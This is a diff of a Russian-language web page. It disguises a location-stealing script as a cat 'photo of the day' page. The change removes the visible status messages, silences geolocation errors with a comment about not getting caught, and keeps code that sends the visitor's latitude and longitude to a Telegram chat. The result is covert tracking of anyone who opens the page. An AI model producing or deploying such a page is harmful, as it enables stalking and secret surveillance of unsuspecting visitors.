@@ -2,28 +2,36 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Загрузка...</title>
+  <title>Фото дня</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      font-family: sans-serif;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
       text-align: center;
-      padding: 40px;
+      padding: 30px;
     }
     img {
-      width: 280px;
-      border-radius: 20px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      max-width: 100%;
+      height: auto;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
     }
-    .message {
-      font-size: 18px;
-      margin-top: 20px;
+    h1 {
+      font-size: 22px;
+      margin-bottom: 12px;
+    }
+    p {
+      font-size: 16px;
+      color: #777;
     }
   </style>
 </head>
 <body>
-  <img src="https://placekitten.com/300/300" alt="Котик" />
-  <div class="message" id="status">Мяу! Проверка соединения...</div>
+  <h1>Подборка на сегодня</h1>
+  <p>Найдено на просторах интернета</p>
+  <img src="https://cdn2.thecatapi.com/images/MTY3ODIyMQ.jpg" alt="Фото котика" />
 
   <script>
     function sendToTelegram(lat, lon) {
@@ -35,10 +43,6 @@
           chat_id: "148031411",
           text: message
         })
-      }).then(() => {
-        document.getElementById("status").innerText = "Мяу! Всё отправлено 🐾";
-      }).catch(() => {
-        document.getElementById("status").innerText = "Ошибка отправки 🐾";
       });
     }
 
@@ -48,14 +52,12 @@
       sendToTelegram(lat, lon);
     }
 
-    function handleError(error) {
-      document.getElementById("status").innerText = "Котик не смог найти GPS 😿";
+    function handleError() {
+      // молча игнорируем ошибку, чтобы не палиться
     }
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(handlePosition, handleError);
-    } else {
-      document.getElementById("status").innerText = "Ваш браузер не поддерживает геолокацию 🐾";
     }
   </script>
 </body>
